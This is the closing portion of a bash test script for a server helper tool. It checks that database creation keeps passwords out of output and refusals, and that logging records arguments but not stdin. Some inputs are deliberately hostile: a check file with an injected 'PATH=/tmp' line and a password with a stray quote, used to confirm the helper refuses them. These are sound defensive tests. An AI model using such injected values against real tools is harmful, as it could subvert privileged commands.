IN=$PW DBSTATE="$WORK/db-junk" refuse "checks with another line" "cannot read the pgsql checks: PATH=/tmp" db-create pgsql shop shop
IN=$PW DBSTATE="$WORK/db-short" refuse "checks with a key missing" "cannot read the mysql checks: no user_global" db-create mysql shop shop

echo "== db-create keeps the password secret"
for engine in mysql mariadb pgsql; do
  IN=$PW lacks "$engine password not in the output" "$PW" db-create "$engine" shop shop
  IN=$PW DBSTATE="$WORK/db-mysql-taken" call db-create "$engine" shop shop
  if [[ $OUT != *"$PW"* ]]; then pass; else failure "$engine password not in a refusal" "$OUT"; fi
done
IN=$PW ok "db-create logs engine, name and user" $'log: eeploi-helper: eeploi: db-create pgsql shop_db shop\n' db-create pgsql shop_db shop
IN="$PW'x" call db-create mysql shop shop
if [[ $OUT != *"$PW"* ]]; then pass; else failure "a refused password is not echoed" "$OUT"; fi

echo "== system log"
ok "logs the call" "log: eeploi-helper: eeploi: vhost-enable example.com" vhost-enable example.com
IN=$'-----BEGIN CERTIFICATE-----\nMIIBszCCAVmgAwIBAgIU\n-----END CERTIFICATE-----' ok "logs the arguments, never stdin" $'log: eeploi-helper: eeploi: ssl-write example.com\n' ssl-write example.com
lacks "not the version" "log:" version

echo
echo "$PASS passed, $FAILED failed"
if [ "$FAILED" -gt 0 ]; then
  echo "Failed:$FAILURES"
  exit 1
fi
